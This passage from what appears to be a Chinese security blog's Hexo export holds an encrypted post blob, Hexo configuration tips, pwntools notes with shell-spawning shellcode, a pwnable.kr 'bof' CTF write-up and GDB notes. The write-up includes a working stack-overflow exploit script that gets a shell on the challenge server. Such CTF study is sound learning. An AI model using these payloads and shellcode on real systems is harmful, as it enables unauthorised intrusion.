37155afd734d1ff96127abb848b1859b229957b0bb296e448044f18d78cb86de66d1b084d0d23aaddaec9f19d8da50677600fa7d9c89dc33a3a03d6e833a67cb5053e53ee51c5fdea044d4572224a4dbbcc87660e15ba52c49d5553e6e20e928d24120b108951fb58e756f958034fa46086f19411ff1795738ea8d487e65683d80dc3a5aa4728315658e0d16bf1dd214a1df7b2c0425e7174611a41cc06c4a69f8e49732fd3aa5ecd5d911247a528750a7c29ad0b195229e8666829b815614d45aaa8f5dafacc3e777964d16747d9081d318026c114aca0d72381cfb7cde80770112ab857264a7d69d9f46672ce07838c97a6f901ece8258ef8ca330a2d16f40cf0f2ba96c9f9a1b87982ecef29f6dcfb88a3d79097b7a1427fc9d5f7557bc234e36fd6bd56e2f04cb35245ebc79f710d41a74b275f0baa0b5a773339b02b90b543f6cfc89b5ea3274147ecbf40e868453dd1c9f33cf897bfd725cea713404d5eee429c36155232a65de8ad12a2a84e341e129f215feb1848b0baf23d0ab241c3528e8d98ea1b6562b9e20eaef92f05d54800cf95a15793c0303cabf4749d86a2e31aa38e553f8f2d68478d8b4d4bd609e9f82df89eb374fb4c5c9d3e9ecf77ae955279e954cf7b05cc2ba0d4caaf226482ee87f9975646ffa7fb0cb0a14ce8f130d9132b3b995f50e1b07d372348e5fd452bb2ae9b9e7ec5cdb89d3ef3d3910d47bbb4d2f748b74ca62465c43334216f0701c05f987dd9c54d29001f2ace29fc743abe373f0ff561a7728c8aaf7d8cfa40955afee5b0a1232d805dfcd0011fca1464fc828aa0c3f0088483fbc10d4ffbbfb932b0d978fc086541b14aa99e5378b547409fe7ebbba9eda39d83313136054a80148548ef04f66f83b763f48e41dd0de702987ee46506dd195f9dcb673c589d646e0d9f9c68accaa9b41ffe01a96909bc1148f52d40f629ada4f33dc09da98044977731e9fd9854035b893e7b35ab834f823fa405b165d7241fb83310620ef7f5d781ac6babe353d22c1f360e213eca1ad2b5d321caceccf52be860fa1438543906c69b72e998af4678e63475fffb9c490f253f33caa9d3117837d4a8001571e0a1b070cf44658f1fea7244460ccda4da15e013f67e8c26a0bb1f5e081cf74e82885f35c002a66ae370bf3b231747b375b3638778df36e7a6ba471e6923318e2e2fa4c84b8e1e3f33519b825ba4371d1405c8bf6d139fe5587a17cf61b1c085aa387bf865d482a32522111a0ef2cfc377feb6f02e2f88d7e7fe0a6384d443aa6419bf88446074a657f88b262e0d17605580b755d91b30f8d92fd2f9e942d62a07a77275c0d6af092fab0d442e0505f9cc0c82138aef385e5f630097be093eeb332b0103e72d23fb39479b3fef41ed99f0d830fe4af65223b87a9faa73f0c009d2fad408acac65f220404152eb210892883117f4df48cef7549b9fa7bd17b5385d43a3279cd463177faceee2d3dc27822856cf00b1be3d2cdc054fe347b37b64b78a5958e8007733ab34460efb76d408ad4f66bf1371d636ccf3664f26f40eaa2e23e2092d62167b4bcbcf8b461d81f50ae49b55af52042c55570b69fd3dcbb26a4ba2b1da6f2b9e64cb0946e0407cc30bc920523e65ae4687edbdb393f42c83129b0a03a8b5e3ba91c5a2dc2f8feccc2643300c8cc13d3c8fa4395bac0c0c272476d59cb1358448e91d1cef754b27564df773164869a974b0fcdac321f1e66ff42415dfe6dc3f391db9f04ac349b3c9e07ba8773c2f45341a2ca50de28f6a4c6569301ca301ff9c20a8736a226c6ca1288502edba59941a0f4353c4c7b5ed59af2fc20b1228e8f46e0d60cf135848ea72f8a565d5798516bbeea2e5467ced23846a06e13135025de1c08bcbdba86f267b472ad4c7b85ff26d34556c4a65915cebc11c65fb8c3fea0e41150e11215ebe066db5be691f7ef6512147ce4a9b34916395ac4a7b9e0906c7839b35a189e7bd40a977b2c4798c6616bd134f2cc2dd33923714e90cda95c7d29d2e5dcd209c5f99ecaaf965282d297378ae6ca1909833ae3c095433e517b60b2999fb4242b77e65a50d45bcecad3cfc340e649d1f85cbcc8d71ed9a93dafc2b10e1436887bcaa0cb875401c8c3b30453835faab4f79773677e203207f1e585c70a0f81bc9aa5b245a371c694e9bb4bd759a67770eb083a763157fd870a96b717381bd4ca4a5e7f34eca213de792c0ef71ce67934fac5a2f5d853018fdab963e091e73160b68a7e3ad5c4795e61c1537a2a62384d826193a88234cbd27582abd8cd1896e7bc9bc10a686ff17f104a7562fdae96dc8e0547574c115a54052f494693a9e0148167ef83aee1970ba12d7e5a84b521e95b1dd5e31a10013ca0a921a992ba15a38b25097f9be6816a59a9c94c5e42b6db0ee2533cd7481a921ed8e03779e1956547afd50c95798ef9673ff4f4583375d11b3866797a4cab283f3dff7e2e992d16d3aef5f8da61c649928b58ee9eff1992fac08c27c82e0622957c209afdfa0590ad0ed34102044837a1cd224da40a43f487c475d003bb5d3491a14edd24abd889d3d2a782e16154d1fe032c142c7796a2fbe6c7de31b20d548cda22b1d14ad321098856ccd16af9b7cbde03aeb6b3f6975bd7ac774b221b5021ed1c4e70163b0bcbb64068b5bb469eccc6282e7566d5acf6231eacbd67fe74522280302c6134e5fd533aeb921a4edc8fe975ae3feebfe831d46525b6222dcc21e8ae4b2ab3cc00a32700195a95c1baf53d61276e23c0df758e7f7c4c38b1a7c800f88ccd6abc16c02d10e35b653415bd4eba2806f53d37cb6b235267a0a979185f769483d89e41b1d71e772de81fceceb67e4ae2bfdd013198cb28ec2845eaf1fe0d569c49a290dafcdaea7a7d75e2e69f42b5dc10364966339d9d508a1f081654ed65d31ae67c5e5ba37e5470ec406143ab49e374c9984a52c8c92d21f5bc04287723156bb902d8158ec54a0fd6eeae12b9a14b00b852b30befa880bc3f59a8fdf5e796b621fe27f6d8d5500854fdd0116501a492d7281c9b734d4d174a3c38feda455cbc176b5242652267c8698c5429a7f24c796be8d331e6daac38fdb27b75466501f617a793d188f12e4b089303a02666c1eae802dee5f2837e9e7776d353f4c67305399c01ba92750322f8e7784c8995a8952157a286fba52339dea3001d0ca7bf0d57f35b1d5624d0709a1dc59f59a25104c059a25ec418309d0141023356189c98d199f96527bc7ee2a5f29b5f17e5121361436373a0684a770617b9c61f167e80f577b03d86e3ec7c242e57701f0568eeb517a6ecd68585c535105e618913658d98c01edbe8a6ceb30ab162b727fa8c9465c78ba0c7a719a97aec9b198d2ab7ec42d066193cc2686e60e4482b39a9c330a757d7389fade965f06b22df016141ea8656b3a65a443d4722ed9df341f5f3456d00844dd7f6f3ad3d8c616562c011d33f2feb65530010e2708ade8754ba029ded21a599dc6480fc18fbd9ddf30872921b76456979937f10fb77eaf2cf46ef5856470e75f155a8bac36e8e51ce778e55efc9c5f77305f3201ce838ab947cf204733595488445ca6b632f497fa8fa4a01e14c6bda6141d8e20226016d3b97205ccf623d0770a1fd65db8f1af38f556da4cb8e0c92d6b3e6df3167a1973b92a3ceaa0e4a25282191e34472de9c8effd0f9ac75282db37e3e6260e7d711271a4fcf0393787f2b2046422556768b6d4dec38efcebe95e5cd26ebeff4d86a199881816f9a0a65c2624d11d9b7ce3a152ca18cea0facd53f5d3df1b39e6a6b7ff9baa7b8e8f6bf82e123aad8a656435ea9abbb62d6ea582a0c0763c21347c13b271cefb638fefe3099087b913c0b70be5feb8fb118613b41cb4020bb2dca428e4af01f3287d31f9600e6d12556bb464b25a6914fc0d4c7d53da7fbe5aefc96635d5076a54d01190dfe7eb640faafc313ee9f3102daa86dd1c4ae55782f5a5073319d0e18a26b77f4f81104150e571b1f7c48d600b709552ee95b46c9a41b8581bf0faafb8415f059bdef17b3e5fe95375ab22db11c699f4519d840822431f3056c193ac6db227a7b4d5fb4f15edc6d5654f2a4f8ea8f9d004f6a022028713f516953e1ef6abf2465d4cb61006586daec54955a71761ca310a89b74289fb8b5366fae735cb05aa4f14e1fa1e2146bef4f4200d0991cdd7f7f6c1289ffc1767ff1e323f9ac9917df08d275fdfc822cae5b91dca652dd82a1d2b2dccaedb529ad0ffd85677f4c6141929bcfec032ccbcfa3be86738ebc170734ff643939c892934f755fb69ca6b6511eba5800eb18e7a11425730cfa6d0ed1f462cf2bc8de8d9246afd8449805682b67a900fe94a882c533129b8e256acfe1d4cc729dab997b9e974cb95908950ba9b659117de566251f452c70192498283cc280ecbc683b3832731e5969418cc820cd50d80938a1d348feb1ece8e9a62a0ff9e0bfc53e77387000b044e2bbee0d152fc8071573cca15db0e064c2a604e2d0d840ea2bab9d80e541581cc32e31ac93185aa5d304195c42716624698fd6f113cd38cd471769f6c560a8063c8c9a18f5e26e9e686cac68233970de7dcbe9dd0bf33c1ff9fe8a88de66b5f80e0ecb388ab4db8e5cda8a924bc9d075926ac39170f7dba6161132c48e3dbd8634e6b97c63190a946a4afca031da513b03089d46b1e3d20e0c06047418badc51485bf318e2de1afe6b21a126f2e965097a078daccc8f6d43167113f4b60ca1f3745203eed91869259446ddeb68aa455b42b5f35ab2dbf3cfdf3f67e173b51bdbaedb1809eff87d0a6e26bdc689220f612b12c307572c77e953081d2d1d53382c99255ade686cffc8a9d1885658f0723aa64b0e2b7d6b679ea17c869b27f36d1a68a215a7b936b4bb5273059f6821ec171a3ce72f62ff1e47f04919ae449ea1a37a6d70a03f12af2a93bb5310d5813c89ca24741c871fa330509eb16fd3129bd5ae4adeb88f1e841103249a3418cc19d93df9afe70c5403870982271c071f1a4bc2977a3763ddcdba67e2b2896eea17120d85925e8169b36197ecbe380c211030aa952bbc2b179e344be21f2acb5213faa40ad8c071d382562514173026de7b0cfa6dd6938cafa1e6ffc4a72c37eba2bb4480939d84a696f5f633d9896514d784180e020995d98c2cee5c9b54f0a57670da6b42142feaffb6e6e810ce47a176a7c240d0b3cb775744f4f47783a48dd77f284cfacb2855361fec6eff8983b13c2e670b3a8d4d09fc3e3a84d73aaac361539feef77b58594ebb29840c278ea5df295c806158e10027a0e64f80ca60f0a3041e41c99385690a3c95d7b82b0878771d82068100c7b2ba03c5baf9f861b5ce3bf8dae966bdd61a58c773085d44296b19c8bf1451e74b99473bb9a7e8cc331e2c857a25b3be5be33d099f25626efc919971f57f5c6b03a731d30890bf738be7fbcf533b26fe5f3159b666c0c65e1e602c6eaf66e6a5c56f6b976c319ae553cd2c06530233861a151d7e91d0f9eaa1d4d23fbcfbdd4742c39294f4bab8fee2aa10072f8367ced7783ccff9338bf1689e5bd0a87606506c4d5510dbeeb99ca2fad4427773ea87807f1310c5390650c2123c0ef669148ebc4136d6cb74792b02b3fb1392a838850bf5bc908611faf37dc4c29999a42d5f48ef9cdc14472c5e9078cea7080c2ebaf7045ce340c2ff7007de65e7aff67c80ef0edb6fef04dff4c53c0d776868c1df5ca481d155b5f063d303d1a3eec46603357227cf4f2ad32156ca8e41c62da6194b46fbcf8500789c54c133761f267f1686f71fc3cefb26aa8a2cf2ad018170faf76c6ce4bce49ed7f21515bb91e0f228c7e958d115391969c32d64abd9c19f49b51a258bd9e6ff1c0a7c483df91c6be36788c1eb8505c37158d20034bdf9435778f4dbe3ed4f74a2d1c5b233b20ee3f4fedbbfb6c98aa4a81c753b64f16b1e0ac68a7ce4ced477960506d33a610d6a856d4e89e4e0496f34eda4326fe577aaf672710b2a7d939ac779bd3a24423383fc1ecbe732dbe5807e073647345e95bf3e4faaa057302515a3b15297b066ff69f04c87a3335b2e552cb490b65ca328cdcd687f4fa4fe44288f25e2dbe2190a22c9c698f91c18788181c00ef5d8dd5c63311a1b4e36752e7be8f939826e55024f11f6d2b41fc5e5eb178b3f4b58be651400f34ecae8c43b3a4ec97ba4f1639d8a144bfe713d2e5902d2cc9efc3a5dcff77ad5d7d534b8f7fe6007dee33a079f0b229be331273d772ef7375d996b49421e0faf1fc68d38055a026a11813d0040652e706641ec836c128eea237b988a24a0bd0052527f43c0417f3c776b65649ecc95983a856003650aa296dd673c6b4b786b0eab4132e0c93fa937fb4942d62989f5209401a16ddce11dc1072d5702462aa04c42779e43d621d4953e25cbbe272e8bc4630ccf6b5b0c6e8c9c0cb35b31f331d60c060e066dc0db3efee185f9492e0ccfe3dbce8466a2b9370c9e1078d4e5df2774a807c531462d1a70458f307c3d25916f54d4424e3dcdc2fa38baf73279dc80a9aa33af59f1a8eeb80c2e321ac0e4c2af1229e2938cd05adeeedbd92742328a8c3bec12b0abd2f05b379ba4218c0ab121a367367cd5554a972f0d8ee49a80bd9525669648b846ec8e7d3b098d16f0b83d1f40b058c2c1c421d652e10de886cdffa2d440eb50f6e8e6f1db831be48f418cc43d164d3c5c2fe832f3e18cd4605fa9de099014de717852894fee27c5bd23c541f927a15c0f9637b6cb5a8913d1889cb66bb7bbb038bf5504e837a5583e40dd2d9f08d1d14ab67b0d1716ef6124a02129bf47635108f1d7094bceef43bf2f4202a73ce3c022741941f9d9b613c68fa2e09df000940591a22679df2652010de2d81242e1f99d19f1f5dbb3750a979d953ca51fccf5536c4356e9ea9f48cd26692ce08ccaaf50d31f932c82670cb4f749ead19ec1e45f145c7e6c5b00b5355b56b237afa0912f33f21157b27b86fb5e8268bd4c95334dec9e814841761624f9024ebcc5e23c3b3f7ce3bc4faf6fcdead77b1efaae4a56ce7b7117b9dfc1b430e54806f55784f9f4ecfc8a32ce21f92057b65fe0e1b635c4f7ae14b95db4e2205c7f2478606e64b953396002b5a851ffc756b47928974dcfca152822b3c29d26a5173a1cac5aa2c8ecc06e24ba2502ee2558003cc81664a0203358bd1f2c4665e06ebd57be4e7c835c9dcfe908ea4a70c8e0790bc6501fea4a1cdba72a2f22a3f70896bd9c7adcc34c04a5ece6c86196d15f3cd8899ac82e2f769aebc74f9cb4107390bf7794c0a7cd8ccfd6c85c2a90dff32ad04bb450dd4340e36985d10a7c51caba9e290912f7b00e3dd69b484ee22ffda9e63e35329faec424bf9a73c2e9a53ed30a6bd52c20453d1d672e74a15bac11dced1f5bc723403ebc72b7d0f8326ba74f69b9b6f8eb0744e24bc6efb3356bb9c157452a48c4910195cca6e8a8e41b44e82c411a134d1addc9e4bd61481577ad26903174d042f5b08be9299ce89092a343513fc73f2cdb47c9ed3e47bd74f5dcb95ce2871f368436b6221c90d527d0c0bcaedfe0413ccdba4620a70cb445fea8d9bf3ca3f1a5c6746e80963e25015141c27c12a1954c979d7015cbc5617ce0157be7fb94426e7e1158f049925ddbcc428d4ee6ec25dcde5dedcb7a8537954c9bbdb9fec323434b184f3983e4c6333badaaee24f3fb4876c1a6473984f24da02f0e4e2b45defe1332c592a404cf67f07de0c93cd8efebd634260aecc8b38d39df9782c8826c5f1d424924cf803f3754ddda174526449d7a1ca1d38e1cbed5d506fabeb918e8cc3c76ac723a127714f3e4dff28df23e8a2e4aea80c2981610c6d30529bfb85174aaf55417814eeea779aaeec55b5df8a2bd7b8859e77372169fc5de45074785e95a47e5c4cdf5b7cc91322d20472d31c2e695ec9cae1a4be1b0f30b04b0cde96928ebbccb4bcde2cadf78e391af909ef4305067d85bb28f5bc5e6d8c121e0c868613b3d075aa9632950c4dbe41e177669d3a379e6cf5de5fc9560408a72707f53fc9c7bafd861af8db088ca24d2ebcab24f977b33474a5f7bf9893356b91dfe55d1b5b81b45442440b72608ba6672ab77ab8497a520276546a65b86c98fec2ac1f44ad5adeed9bbcb49af7cce011a2403a1c5cb0f8fd86e203bccce9e5852ae19f1aba4c1e3c3356703fe15dc47fc2314b36d2efc5ed21ce7cb6440e779fa5026386caaa965f0d75af83141375bcc8b5a942d8867767a7b420accb08787f3c77545dc05b81a9dedb7cd05a063d1220f35344ca5437286247cceef15a1a8543c958113654d427dfb107d72c759fb1db3381a2de8749390b6338e117b5e17bd416992c2e5dc78069fd4638e5ceb3926724e740a690d7cc00afd44ac856b2091d63858ccc8da3e82035845ce39959de5be2fcc9baa7343b50ed383d39ee1f4583ad963a7da23650d596e564357c1ab1e3f83ac9505285f38fb78fe643d9b495275b9cd544595070ddddbc6141c82fcacea8a0462c92fc2145fbbdbbfb58ba9be6f2ba39eac726e47634d4920d26dce978d0e63c03d31fa05d9a3bfdcbb6bd2671e429e2cea88f2472c804adeda1a1cfb85521cf1eee7e8e9d9f6a3615fd63d2f11061b12fda05325bb7bf41259d42b3a6c5a2bcbfd96c652a38ee5de54aeb2f0b3fd938baaba9c3bb292881c81c149b32ad41a0003bff2185f60d6d427dbcb156354f4e92c4fc158db4dd0167b0bf1ed33d1526008ca66ca8df2d45f81eedd98d5643d2d0caf5795ec2a373962246d1446cab05921cae5fb81bed9b254678069d332f2bf2d084ff2e7d057279d10d1f82d4f584040ee2dcbda88fab3b984fcf358c9dca3ca72004eabf0af83cb92baa67fc4aa7f71e427684645e44d8be8cf4e524eb551d6dbfe6cae7b7118884fec358f9cd097528ec78fd9b238327424100065c0b9b350f17235b69a26fd1900ede9bae99f61846b0a33c37ac96e4582ac91ff403bc69cbac7c1c4069c40053830ff3d65e8140e2cc0cea64f9318250a8fac57eecc5b38c422fffc1ecd91050b64b5229292917dad4256871b6f4226817cad70806ff43c38c9b02384e04ef0ab5d1d4dd2d2685051b9103f59d0b90bfc945b445ecdb0c769f5a1cced2933c253cf729dc4c5a6d1239f2d220b4ffd2f34139c111a53d350ea76594b5982516881e09a5e294e60790a857147cf159ecec7d121304859837f2c1fe31274ca3df05439284ff8fe68012bb114915bef8559ef41566f1b9fe6fb82fc29eacdbfb217eaf8aede091d83a00467625b477d1b3fa669def6921df246797d621949b7374844f3b6bb3c7fb2b6c734bb62186e28157d6f1c35637a39be70d9bb49bf353d2849d7368abae7bf813aea9aa4a9fc4c9850225225a678efa3d4ca5b27736fec95a0e257ed3f5a029bf3b1f8393c50b1dbf9684dd791e2e9b96dc1cd3c12c88d19c32e290caa5bf98c185a0edb675881b17f31f8932b1b87b1050c146047d8b72a2a9699263c434ba79f98eb6b0bbb6d6e0b8c446919d5117cea3677dce98df58506409ec28698343e4f7fa578785b27a7878eaca115bb5154c5511f89376c43286f6679a56aa7cb57efa1cd5bb651b06e10d22bdcd8b11270009a8bd7710629fe42de80d26148714a4b9ca15ee3c3c57dfe113720fad2877dcaeb7743068d444a924b2f01c72c582e106a49181fadf1676bb12290eee0a05f29bd86e346f464fe84f2ff45ce01785f509c2c13f6bb59b4575ab87774e815d8639ca331c3b68a9b1cca2dd079bcb10a7d67351c2b98423261db00b5c179c685f6581dad102e1b9a41a2d332b46e40acce7685573ca2e662c3bd9142f5060fec3306523f86f36ce88b0f28a23136c5c7048c0106e62c21742a30f475b538244daaf7f6cd9d191f569df456729e3a468d376b7b1187a299a4c19d323623df5a1dd3d96081246e6412c37b19e6522ce63a91457639d54d8354090833d4d83d78e40fccac768b670a31be4f6638c3e3543bfe919a13ffb49f314d2007a5a76137d614f54f7936f9c1a3015f27841217da97bf253542c4595d37081e9bd68c88789652f4475e342681b0feb33e58abe4668d84e5b1beb7ea5ee7e0112b405df554e3f60e7a7ed7939a0d58278d2735815d07a408cef59c866a617c3228a50fc6d4968682935d39deb3a196d1f174998b71db5163c98d4c1855c4f0180e8350bdf7c5e2ef1b04b76209eac8dc374a31545f1b5f10ae70b168d1716057e95d0b672ce6268dbc36ab9a0105594ce07ea1118155c43ccd780c79877641f2692f4ecb71d783bc656c4b13cdc78a47bcecf584012bd6ce82675def0bd8e9674b2c205e414fd79294dca947835fd3b44b66f112bd3df4192a194eedfba429aaeae7c69d422057ddf8f6e06fd22686eaa80a753f1b42f3b3860dc492aa91a58b500268e213cf6203328ba13c9ebb61a177de064fa590a1701745f635df7c45a391313d1f848104f5da0e6da00ab9f98eb037d1a186241111e42bf8b3948e9023f69f52551b6697bd61488e36794763197b63a4a72335071d5c801ebb39e220ef363ef10d2de6bcde79d03763f5351a62145d3c99771b6366a568330c6249f408c57c9f45fd245f3b459d4183f0b04b70e5d095ff9fbb56e466a12ef72f1ca4d2d91809bcef3556aae5b5f54ad8c0e72eace9538142640d84afd3d06d618990d938c21999b0e7cd1ead407a83dab1bd39706c7676d4f8bbe4883cdbf2eb86df510723f26dadd7742bc294a1a8bfaef106353c04f8be2e40ed601d69129313498cac3b67b24171d8bceacc4f333c52f1ead91ee452e35db224fb4d43107f8a77500478edce468b9f15b2ee277f25c5456690a5cb851c18a0ac914b6c36427c696d1e5e2684828d8dc608cbe91356cee3ead571bc52086e5bcf4e49654b02a60554c47e4103fc79e507a677d1905fcecf79aea9490df6584886b8cf4abe72459400d8482c510aa6ed9bce165a8f6be68f43adfb5b4adac0d0233e02950b2194844f715b7eda95b6e1676557cad4d7e29029e8a9e934c99565b93de8367f27b7e7c7517f9f48c4d7047948db6810b5f6547be02478fc6a07dff111f9e81de76944377c0cf8b784b50226215089aed960a5990b274715a846a450111f5af1216b97eb61492a31300cd4f08893004841025ab9cdf1b97fcd294db45d2db593e2d6a3255bb29c821e8de8a5ae38b4e490884838c54fdb6aee7d167da15d4dec48075148e1dadb5e6e4993a70da95dadb27881da8cb7bdd5748066644b7e144419f41407843372c3cb90d31aed1ff88b0378e5048379278d09c272a7100a9a2024a2f327999111e2fbbf2c79a003610d61cd95006efcfa94b60fa621a571bde1d9af9e4488f7d4712b5ba08b9f879efcab2bf8fa2721fa84d7829652e766bc2e81f19a1061dba0bfd9c1f658d404510e1de2b03312d8b3035581e7dc8b869e4ca8cd47b090a727a9f7f391258b421e39fca7be2]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo博客完善（持续更新）]]></title>
    <url>%2F2020%2F04%2F30%2F2020.04.30%EF%BC%88113%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 添加置顶功能 解决Hexo博客文章置顶问题 修改Hexo文件夹下的node_modules/hexo-generator-index/lib/generator.js，在生成文章之前进行文章top值排序 generator.js最终的内容： 12345678910111213141516171819202122232425262728'use strict';var pagination = require('hexo-pagination');module.exports = function(locals) &#123; var config = this.config; var posts = locals.posts.sort(config.index_generator.order_by); posts.data = posts.data.sort(function(a, b) &#123; if(a.top &amp;&amp; b.top) &#123; if(a.top == b.top) return b.date - a.date; else return b.top - a.top; &#125; else if(a.top &amp;&amp; !b.top) &#123; return -1; &#125; else if(!a.top &amp;&amp; b.top) &#123; return 1; &#125; else return b.date - a.date; &#125;); var paginationDir = config.pagination_dir || 'page'; return pagination('', posts, &#123; perPage: config.index_generator.per_page, layout: ['index', 'archive'], format: paginationDir + '/%d/', data: &#123; __index: true &#125; &#125;);&#125;; 0x01 添加上传PDF文件功能 Hexo 博客上传文件 首先修改程序配置文件 _config.yml 中的 post_asset_folder:，这个选项设置为 True。 在 source 文件夹下创建名为 pdf 文件夹，将我们需要上传的本地文件移动到这个文件夹。（如 test.pdf） 最后在文章中，按照下面的格式引入： 1[点击下载文件](/pdf/test.pdf) 最后重新 hexo g -d 更新就可以了。 0x02 添加在线浏览PDF文件功能 hexo中插入pdf解决方法 将_config.yml中的post_asset_folder选项置为true 在 source 文件夹下创建名为 pdf 文件夹，将我们需要在线浏览的文件移动到这个文件夹 在test.md文件中添加如下代码：(不一定非用object标签，embed、iframe标签也一样) 1&lt;object data="/pdf/test.pdf" type="application/pdf" width="100%" height="100%"&gt; data表示你要上传的pdf的路径,使用相对路径，将你要上传的pdf放入第二步生成的test文 件夹type和width就不说了，这里注意height不能设成100%， 0x03 添加文章加密功能 hexo-blog-encrypt 安装：npm install --save hexo-blog-encrypt 在 _config.yml 中启用该插件: 12345678910# Securityencrypt: # hexo-blog-encrypt abstract: 有东西被加密了, 请输入密码查看. message: 您好, 这里需要密码. tags: - &#123;name: tagName, password: 密码A&#125; - &#123;name: tagName, password: 密码B&#125; template: &lt;div id="hexo-blog-encrypt" data-wpm="&#123;&#123;hbeWrongPassMessage&#125;&#125;" data-whm="&#123;&#123;hbeWrongHashMessage&#125;&#125;"&gt;&lt;div class="hbe-input-container"&gt;&lt;input type="password" id="hbePass" placeholder="&#123;&#123;hbeMessage&#125;&#125;" /&gt;&lt;label&gt;&#123;&#123;hbeMessage&#125;&#125;&lt;/label&gt;&lt;div class="bottom-line"&gt;&lt;/div&gt;&lt;/div&gt;&lt;script id="hbeData" type="hbeData" data-hmacdigest="&#123;&#123;hbeHmacDigest&#125;&#125;"&gt;&#123;&#123;hbeEncryptedData&#125;&#125;&lt;/script&gt;&lt;/div&gt; wrong_pass_message: 抱歉, 这个密码看着不太对, 请再试试. wrong_hash_message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容. 将 “password“ 字段添加到文章信息头： 1234567891011---title: Hello Worldtags:- 作为日记加密date: 2016-03-30 21:12:21password: mikemessiabstract: 有东西被加密了, 请输入密码查看.message: 您好, 这里需要密码.wrong_pass_message: 抱歉, 这个密码看着不太对, 请再试试.wrong_hash_message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.---]]></content>
  </entry>
  <entry>
    <title><![CDATA[pwntools的简单总结（持续更新）]]></title>
    <url>%2F2020%2F04%2F30%2F2020.04.29%EF%BC%88112%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、基本模块1.asm/disasm功能：用来进行汇编/反汇编。 例子： asm 12&gt;&gt;&gt; enhex(asm('mov eax, 0'))'b800000000' disasm 12345&gt;&gt;&gt; print(disasm(unhex('6a0258cd80ebf9'))) 0: 6a 02 push 0x2 2: 58 pop eax 3: cd 80 int 0x80 5: eb f9 jmp 0x0 但是，大多数时候不需要编写自己的shellcode！ pwntools带有pwnlib.shellcraft模块，该模块中装有有用的省时的shellcode。 假设我们要先设置setreuid（getuid()，getuid()），然后将文件描述符4复制到stdin，stdout和stderr，然后弹出一个shell！如下： 12&gt;&gt;&gt; enhex(asm(shellcraft.setreuid() + shellcraft.dupsh(4))) # doctest: +ELLIPSIS'6a3158cd80...' 2.dynelf dynelf 官方文档 功能：动态解析函数，仅提供指向任何已加载模块的指针，以及一个可以在任何地址泄漏数据的函数。用于远程符号泄露，需要提供leak方法]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pwnable.kr的奇幻之旅（三）[bof]]]></title>
    <url>%2F2020%2F04%2F29%2F2020.04.28%EF%BC%88111%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、相关知识1.pwntools工具 最近将会认真的总结一下相关的知识点 2.函数调用在栈中的表现形式 可以参考这里) 3.栈保护机制相关知识点 将会和其他知识进行总结 二、题目分析 ① 首先检查bof文件的类型，发现它是一个32位的ELF文件 ② 然后查看bof文件开了什么保护，可以得出相关的保护基本能开的都开了，这让我一个小白如何是好？接下来先看看源码。 1234RELRO: Partial RELRO =&gt; 对GOT表具有写权限Stack: Canary found =&gt; 开启了金丝雀保护，具有cookieNX: NX enabled =&gt; 栈不可执行PIE: PIE enabled =&gt; 开启了内存地址随机化 ③ 在IDA-32进行F5逆向，得到如下的伪代码： 123456789101112131415161718192021222324/*main函数*/int __cdecl main(int argc, const char **argv, const char **envp)&#123; func(-559038737); return 0;&#125;/*fun函数*/int __cdecl func(int a1)&#123; char s; // [sp+1Ch] [bp-2Ch]@1 int v3; // [sp+3Ch] [bp-Ch]@1 v3 = *MK_FP(__GS__, 20); puts("overflow me : "); gets(&amp;s); if ( a1 == -889275714 ) system("/bin/sh"); else puts("Nah.."); return *MK_FP(__GS__, 20) ^ v3;&#125; 打开bof.c文件，得到bof的源代码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; ④ 画出overflowme、key以及其他参数变量在stack中的位置，如下图： ⑤ 发现，如果将传入的0xdeadbeef通过栈溢出换成0xcafebabe，而且在程序里面已经有调用system(&quot;/bin/sh&quot;)的语句，只要替换成功就能调用，那上面的保护基本也没什么意义嘛。 ⑥ 那么我们就可以利用pwntools工具进行攻击 三、解题步骤123456789# -*- coding: utf-8 -*-from pwn import *context(arch="i386",os="linux",endian="little")r = remote("pwnable.kr",9000)payload = "a"*52 + str(p32(0xcafebabe),encoding="unicode_escape") # 52 = 0x2c + 8r.send(payload)r.interactive() 运行上述代码，然后就ls -l，就可以查看相关文件的权限，其中flag文件有读的权限如下图： cat flag得到flag 1daddy, I just pwned a buFFer :)]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GDB常用命令-内存查看（x）]]></title>
    <url>%2F2020%2F04%2F28%2F2020.04.27%EF%BC%88110%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、功能说明1它是按一定格式显示内存地址或变量的值 二、格式 x&nbsp;&nbsp;&nbsp;&nbsp;/(length)(format)(size)&nbsp;&nbsp;&nbsp;&nbsp;addr 例如 1234567891011121314151617181920212223242526272829303132/* file : test.c *//* gcc -o test test.c -g *//* gdb ./test */int main(int argc, char *argv[]) &#123; char arr[] = "123456789ABCDEF"; return 0;&#125;$ gdb test(gdb) break main(gdb) runBreakpoint 1, main (argc=1, argv=0x7fffffffe4f8) at test.c:22 char arr[] = "123456789ABCDEF";(gdb) next3 return 0;(gdb) x arr0x7fffffffe400: 0x34333231(gdb) x /c arr0x7fffffffe400: 49 '1'(gdb) x /5c arr0x7fffffffe400: 49 '1' 50 '2' 51 '3' 52 '4' 53 '5'(gdb) x /5xb arr0x7fffffffe400: 0x31 0x32 0x33 0x34 0x35(gdb) x /gx arr0x7fffffffe400: 0x3837363534333231(gdb) x /5i $pc=&gt; 0x4004c9 &lt;main+39&gt;: mov $0x0,%eax 0x4004ce &lt;main+44&gt;: pop %rbp 0x4004cf &lt;main+45&gt;: retq 0x4004d0 &lt;__libc_csu_init&gt;: push %r15 0x4004d2 &lt;__libc_csu_init+2&gt;: mov %edi,%r15d 三、参数说明 length format size 